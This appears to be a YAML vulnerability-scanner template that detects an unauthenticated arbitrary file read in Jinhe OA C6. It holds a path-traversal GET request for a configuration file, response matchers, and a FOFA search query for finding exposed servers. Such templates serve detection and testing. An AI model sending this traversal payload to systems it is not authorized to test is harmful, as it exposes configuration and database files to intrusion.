http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - MaxFolderTotal=1
    - '[JHFile]'
    - FolderTotal=1
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini'
id: jinhe-oa-c6-upload-lfi
info:
  author: pussycat0x
  description: 'There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx
    interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability
    to read important system files (such as database configuration files, system configuration
    files), database configuration files, etc., causing the website to be in Extremely
    unsafe state.

    '
  metadata:
    fofa-query: "body=\"JHSoft.Web.AddMenu\" || app=\"\u91D1\u548C\u7F51\u7EDC-\u91D1\
      \u548COA\""
    max-request: 1
    verified: true
  name: Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read
  reference:
  - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  severity: high
  tags: jinhe-oa-c6,misconfig,vuln
